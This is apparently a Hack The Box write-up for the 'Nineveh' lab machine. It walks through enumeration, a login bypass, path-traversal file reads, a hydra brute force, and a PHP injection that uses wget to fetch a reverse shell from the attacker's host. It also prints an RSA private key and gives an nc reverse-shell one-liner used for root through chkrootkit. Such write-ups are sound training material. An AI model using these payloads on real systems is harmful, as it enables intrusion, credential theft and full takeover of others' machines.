# IP Address: 10.10.10.43

# Enumeration

```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.43 -t all

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30

```

### HTTP
The site served on TCP port 80 appears to be a default site. Fuzzing for directories, we find: 
```
/department		# a login form
/department/files
info.php
```

In the login form page source we find a comment: 
```
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

In looking at the user and pass parameters sent during an authentication attempt, we see a simple `username=admin&password=admin`

We try type juggling by resending the request with `username=admin&password[]=`
After reloading the page, we are logged in as admin.

In the page source we see
```
<pre><li>Have you fixed the login page yet! hardcoded username and password is really bad idea!</li>
<li>check your serect folder to get in! figure it out! this is your challenge</li>
<li>Improve the db interface.
<small>~amrois</small>
```

In the URL we see a parameter being passed. http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt

In looking for local file inclusion (LFI), we discover that removing the .txt from the end of the parameter causes an error to be displayed.

```

Warning:  include(files/ninevehNotes): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31



Warning:  include(): Failed opening 'files/ninevehNotes' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31
```

We try pulling /etc/passwd using this bug and are successful.
```
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash

...

amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
```

Since we have LFI, we can leverage the exploitable PHP injection vulnerability in phpLiteAdmin.

### HTTPS
On TCP port 443 there is a custom image upload on the landing page. Fuzzing for directories, we find /db which is a phpLiteAdmin login form.

Attempt password bruteforce with hydra.
```
┌──(code㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V
```

The password `password123` logs us in. We leverage the PHP injection vulnerability demonstrated here: https://www.exploit-db.com/exploits/24044

# Exploitation

1. We create a database named hack.php
2. Create a new table within the hack.php database named hack with one field
3. Add a default text field with name hack and value `<?php system("wget http://10.10.14.17/shell.txt -O /tmp/shell.php;php /tmp/shell.php");?>`
4. Copy Pentest Monkey's php-reverse-shell.php (https://github.com/pentestmonkey/php-reverse-shell) to our local web root, editing the local ip and port parameters

Original:
```
┌──(code㉿kali)-[~]
└─$ sudo grep set_time_limit /var/www/html/shell.txt -A 5 
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
```
Edited:
```
┌──(code㉿kali)-[~]
└─$ sudo grep set_time_limit /var/www/html/shell.txt -A 5                                           
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.17';  // CHANGE THIS
$port = 4488;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
```

![[Pasted image 20211122081522.png]]

5. Setup a netcat listener and catch the reverse shell by browsing to http://10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/hack.php

```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4488
listening on [any] 4488 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.43] 53076
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 07:22:55 up 56 min,  0 users,  load average: 0.04, 0.10, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

We see knockd process is running on the target so we read /etc/knockd.conf to see what ports may be available to us after port knocking.

```
$ cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

```

We port knock on the sequence to open SSH and attempt banner grab logging in as ambrois, however, only passwordless login is allowed. 

We find /var/www/ssl/secure_notes/. In it, there is an image file. Running strings against it, we find a private RSA key.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

We save it locally and SSH to the server as amrois and login.

user.txt

![[Pasted image 20211122090733.png]]

# Privilege Escalation

We find a cronjob running every ten minutes that runs a script to clear the /reports directory.
```
amrois@nineveh:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/10 * * * * /usr/sbin/report-reset.sh

```

Looking further, we see an instance of chkrootkit running every minute and generating a report. Chkrootkit is vulnerable and will execute a file named /tmp/update with execute permissions. https://www.exploit-db.com/exploits/33899

We create this file and use a reverse shell one-liner. We catch the shell as admin the next time chkrootkit runs.

/tmp/update
```
amrois@nineveh:/tmp$ cat update
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 4499 >/tmp/f

```

Listener:
```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4499                                                                                                 
listening on [any] 4499 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.43] 32802
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 

```

# Proof.txt

root.txt

![[Pasted image 20211122094407.png]]